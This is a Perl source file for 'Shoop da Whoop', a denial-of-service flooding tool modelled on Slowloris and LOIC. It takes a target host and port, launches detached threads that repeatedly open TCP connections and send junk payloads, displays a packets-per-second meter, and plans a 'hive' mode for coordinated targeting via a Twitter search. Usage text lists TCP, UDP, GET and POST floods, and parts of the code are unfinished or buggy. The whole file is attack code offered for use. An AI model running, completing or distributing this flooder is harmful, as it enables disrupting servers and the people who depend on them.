#!/usr/bin/env perl
#
# Shoop da Whoop
# Andrew Pennebaker
#
# Based on Slowloris and LOIC
# http://ha.ckers.org/slowloris/
# https://github.com/NewEraCracker/LOIC

use strict;
use warnings;
use IO::Socket::INET;
use Socket qw(IPPROTO_TCP TCP_NODELAY);
use Number::Format;
use Getopt::Long;
use Config;

# Curses::UI and Term::Screen fail to compile for ActiveState Perl
use Games::Roguelike::Console;

sub usage {
	# Fail
	print "" . chr(30) . "\n" . chr(30) . chr(30) . " ";

	print "Usage: $0 [host[:port]]\n\n";

	print "Port defaults to 80.\n";
	print "If no host is provided, the hive will be polled.\n\n";

	print "--delay -d sec\tPause between floods\n";
	print "--auto -a [sec]\tPoll hive with optional delay\n";
	print "--tcp -t\tTCP SYN/ACK flood (default)\n";
	print "--udp -u\tUDP flood\n";
	print "--get -g\tGET flood\n";
	print "--post -p\tPOST flood\n";
	print "--block -b\tDo not wait for reply\n";
	print "--help -h\tUsage information\n";

	exit 1;
}

srand;

$SIG{PIPE} = 'IGNORE'; # ignore broken pipes

our $THREADS = 0;
if ($Config{usethreads}) {
    use threads;
    use threads::shared;
    $THREADS = 1;
}

our $HIVE_QUERY = "http://search.twitter.com/search.atom?q=loic";
our $TCP_TIMEOUT = 9001; # sec
our $MAX_THREADS = 10;
our $PACKETS :shared = 0;

our $STAT_INTERVAL = 5; # sec
our $FORMATTER = new Number::Format;

our $tcp = 1;
our $udp = 0;
our $get = 0;
our $post = 0;
our $delay = 0; # sec
our $poll = 600; # sec
our $host = "";
our $port = 80;
our $block = 0;

my $result = GetOptions(
	"tcp|t" => \$tcp,
	"udp|u" => \$udp,
	"get|g" => \$get,
	"post|p" => \$post,
	"delay|d=i" => \$delay,
	"auto|a:i" => sub { $poll = shift @_ or 600000; }, # ms
	"block|b" => \$block,
	"help|h" => \&usage,
	"<>" => sub {
		my @parts = split(/:/, shift @_);

		$host = shift @parts;

		if ($#parts == 1) {
			$port = shift @parts;
			usage unless $port > 0 && $port < 65536;
		}
	}
);

usage unless $result;

usage unless ($host ne "" && $port); # until hive functionality is added

sub flood {
    my $sock;

    while (1) {
        if (!$sock) {
            $sock = new IO::Socket::INET(
                PeerAddr => $host,
                PeerPort => $port,
                Timeout => $TCP_TIMEOUT,
                Proto => "tcp",
                Blocking => $block
            );
		}

        if ($sock) {
			my $payload;

			if ($tcp) {
				setsockopt $sock, IPPROTO_TCP, TCP_NODELAY, 1;
				$payload = map { chr(65 + rand(26)) } 0..6;
			}

            print $sock $payload;

            if ($SIG{__WARN__}) {
                close $sock;
            }
            else {
				if ($tcp) {
					$PACKETS += 4;
				}
				else {
					$PACKETS++;
				}
            }
        }

		sleep $delay;
    }
}

sub shoop {
	my $con = Games::Roguelike::Console->new();

	my $width = $con->{winx};

	my $filler = "~" x ($width - 5);

	$con->attrstr("white", 0, 1, "O");
	$con->attrstr("bold red", 0, 2, "_");
	$con->attrstr("white", 0, 3, "o");
	$con->attrstr("bold red", 1, 1, "/");
	$con->attrstr("bold red", 2, 0, "|");
	$con->attrstr("white", 2, 2, "IMMA\' FIRIN\' MAH LAZER!");
	$con->attrstr("bold red", 3, 1, "\\_");
	$con->attrstr("white", 5, 0, "Press Control+C to quit.");
	$con->refresh();

	my $startt = time;

    if ($THREADS) {
    	map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
	}
    else {
    	flood;
	}

	my $interval = 0;

	# protect against divide by zero
	while ($interval < 1) {
		$interval = time - $startt;
	}

	$con->attrstr("white", 2, 2, " " x ($width - 3)); # replace initial message

	my $pps = 0;

	while (1) {
		my $endt = time;
		$interval = $endt - $startt;

		if ($interval < 1) {}
		elsif ($interval > $STAT_INTERVAL) {
			$con->attrstr("blue", 1, 3, $filler);
			$con->attrstr("white", 2, 2, uc "SENDING $host $pps PACKETS/SEC");
			$con->attrstr("blue", 3, 3, $filler);
			$con->refresh();

			$startt = time;
			$PACKETS = 0;
		}
		else {
			$pps = $FORMATTER->format_number(int($PACKETS / $interval));
		}
	}
}

shoop;